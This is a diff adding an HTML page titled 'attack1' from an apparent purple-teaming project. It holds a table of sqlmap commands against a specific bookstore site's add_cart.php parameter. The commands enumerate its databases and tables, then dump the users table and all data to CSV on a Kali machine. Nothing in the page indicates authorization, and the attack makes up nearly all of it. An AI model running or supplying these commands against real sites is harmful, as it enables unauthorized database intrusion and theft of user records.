@@ -1,0 +1,56 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="sql.css" />
+    <title>attack1</title>
+    <style>
+        table {
+          font-family: arial, sans-serif;
+          border-collapse: collapse;
+          width: 100%;
+        }
+        
+        td, th {
+          border: 1px solid #dddddd;
+          text-align: left;
+          padding: 8px;
+        }
+        
+        tr:nth-child(even) {
+          background-color: #dddddd;
+        }
+        </style>
+</head>
+<body>
+    <div class="menu-bar">
+        <h1 class="logo">PURPLE <span>TEAMING</span></h1>
+        <ul>
+            <li><a href="profile.php">Home</a></li>
+            <li><a href="#">About</a></li>
+        </ul>
+    </div>
+    <div class="table1">
+        <table>
+            <tr>
+                <th>command</th>
+                <th>detail</th>
+            </tr>
+            <tr>
+                <td>sqlmap -u https://www.atholbooks-sales.org/add_cart.php?id=102 --dbs</td>
+                <td>To access the database of the target.</td>
+            </tr>
+            <tr>
+                <td>sqlmap -u https://www.atholbooks-sales.org/add_cart.php?id=102 --tables -D heresia_atholbooks</td>
+                <td>To access the heresia_atholbooks tables.</td>
+            </tr>
+            <tr>
+                <td>sqlmap -u https://www.atholbooks-sales.org/add_cart.php?id=102 --batch --tables -D heresia_atholbooks -T users --output-dir=/home/kali/Project/ --dump</td>
+                <td>To store the data of users table as csv into /home/kali/Project directory.</td>
+            </tr>
+            <tr>
+                <td>sqlmap -u https://www.atholbooks-sales.org/add_cart.php?id=102 --batch heresia_atholbooks --output-dir=/home/kali/Project/ --dump</td>
+                <td>To store all tables data into csv file in /home/kali/Project directory.</td>
+            </tr>
+        </table>
+    </div>
+</body>
